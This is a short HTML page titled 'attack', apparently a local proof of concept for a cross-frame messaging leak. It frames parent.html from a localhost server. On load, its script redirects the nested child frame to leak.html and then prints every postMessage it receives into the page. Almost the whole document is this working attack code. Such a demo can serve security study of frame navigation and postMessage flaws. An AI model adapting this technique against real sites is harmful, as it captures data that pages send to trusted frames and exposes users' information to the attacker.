<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>attack</title>
</head>
<body>
	<h1>attacker</h1>
		<iframe id="test" src="http://127.0.0.1:5500/parent.html"  frameborder="0"></iframe>

		<script>
			const f = document.querySelector("#test");
			f.onload = () =>{
				f.contentWindow.frames[0].location = "http://127.0.0.1:5500/leak.html";
			}
			window.addEventListener("message", (e)=>{
				const div = document.createElement("div");
				const text = document.createTextNode(e.data);
				div.appendChild(text);
				document.body.append(div);
			});
		</script>
</body>
</html>